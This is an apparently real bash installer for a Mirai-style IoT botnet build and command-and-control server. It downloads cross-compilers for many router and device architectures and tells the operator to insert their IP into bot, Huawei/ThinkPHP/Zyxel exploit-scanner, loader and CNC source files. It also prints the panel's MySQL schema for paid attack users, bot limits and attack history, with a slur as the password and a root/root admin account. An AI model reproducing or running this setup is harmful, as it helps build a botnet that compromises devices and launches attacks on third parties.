#!/bin/bash
function pause(){
   read -p "$*"
}
yum update -y 
yum install epel-release -y 
yum groupinstall "Development Tools" -y 
yum install gmp-devel -y 
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10 
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
clear
pause "dependencys installed!! press [enter]"
rm -rf /usr/local/go 
wget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz 
sha256sum go1.10.3.linux-amd64.tar.gz 
sudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz 
export PATH=$PATH:/usr/local/go/bin 
source ~/.bash_profile 
rm -rf go1.10.3.linux-amd64.tar.gz
clear
pause "golang installed press enter!! press [enter]"
mkdir /etc/xcompile 
cd /etc/xcompile 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2 
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2 
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2 
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2 
tar -jxf cross-compiler-mips.tar.bz2 
tar -jxf cross-compiler-mipsel.tar.bz2 
tar -jxf cross-compiler-powerpc.tar.bz2 
tar -jxf cross-compiler-sh4.tar.bz2 
tar -jxf cross-compiler-sparc.tar.bz2 
tar -jxf cross-compiler-armv4l.tar.bz2 
tar -jxf cross-compiler-armv5l.tar.bz2 
tar -jxf cross-compiler-armv6l.tar.bz2 
tar -jxf cross-compiler-armv7l.tar.bz2 
rm -rf *.tar.bz2 
mv cross-compiler-i586 i586 
mv cross-compiler-m68k m68k 
mv cross-compiler-mips mips 
mv cross-compiler-mipsel mipsel 
mv cross-compiler-powerpc powerpc 
mv cross-compiler-sh4 sh4 
mv cross-compiler-sparc sparc 
mv cross-compiler-armv4l armv4l 
mv cross-compiler-armv5l armv5l 
mv cross-compiler-armv6l armv6l 
mv cross-compiler-armv7l armv7l 
rm -rf /usr/local/go
cd /tmp
wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz -q --no-check-certificate -c
tar -xzf go1.13.linux-amd64.tar.gz
mv go /usr/local
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
go version
go env
cd ~/
clear
echo "compiled"
echo "Change IP's:"
echo "/bot/huawei.c"
echo "/bot/thinkphp.c"
echo "/bot/zyxel_scanner.c "
echo "/bot/includes.h  (4 Places)"
echo "/cnc/main.go "
echo "/dlr/main.c "
echo "/loader/src/main.c (Lines 30, 31, Twice on 42)"
echo "/scanListen.go"
pause "please change the IP's to these files then once done put them in the vps and press [enter]"
clear
pause "make the passord retard for the mysql:) press [enter]"
echo "type service mysqld start; mysql_secure_installation"
pause "press [enter] to continue"
echo "how to make the sql db"
echo "make the pass retard"
echo "service mysqld start; mysql_secure_installation"
echo "mysql -pretard"
echo ""
echo "CREATE DATABASE who;"
echo "use who;"
echo "CREATE TABLE `history` ("
echo "  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,"
echo "  `user_id` int(10) unsigned NOT NULL,"
echo "  `time_sent` int(10) unsigned NOT NULL,"
echo "  `duration` int(10) unsigned NOT NULL,"
echo "  `command` text NOT NULL,"
echo "  `max_bots` int(11) DEFAULT '-1',"
echo "  PRIMARY KEY (`id`),"
echo "  KEY `user_id` (`user_id`)"
echo ");"
echo "CREATE TABLE `users` ("
echo "  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,"
echo "  `username` varchar(32) NOT NULL,"
echo "  `password` varchar(32) NOT NULL,"
echo "  `duration_limit` int(10) unsigned DEFAULT NULL,"
echo "  `cooldown` int(10) unsigned NOT NULL,"
echo "  `wrc` int(10) unsigned DEFAULT NULL,"
echo "  `last_paid` int(10) unsigned NOT NULL,"
echo "  `max_bots` int(11) DEFAULT '-1',"
echo "  `admin` int(10) unsigned DEFAULT '0',"
echo "  `intvl` int(10) unsigned DEFAULT '30',"
echo "  `api_key` text,"
echo "  PRIMARY KEY (`id`),"
echo "  KEY `username` (`username`)"
echo ");"
echo "CREATE TABLE `whitelist` ("
echo "  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,"
echo "  `prefix` varchar(16) DEFAULT NULL,"
echo "  `netmask` tinyint(3) unsigned DEFAULT NULL,"
echo "  PRIMARY KEY (`id`),"
echo "  KEY `prefix` (`prefix`)"
echo ");"
echo "INSERT INTO users VALUES (NULL, 'root', 'root', 0, 0, 0, 0, -1, 1, 30, '');"
echo "CREATE TABLE `logins` ("
echo "  `id` int(11) NOT NULL,"
echo "  `username` varchar(32) NOT NULL,"
echo "  `action` varchar(32) NOT NULL,"
echo "  `ip` varchar(15) NOT NULL,"
echo "  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP"
echo ") ENGINE=InnoDB DEFAULT CHARSET=latin1;"
echo "exit;"
pause "done press [enter]"
echo "run sh autoinstall2.sh after"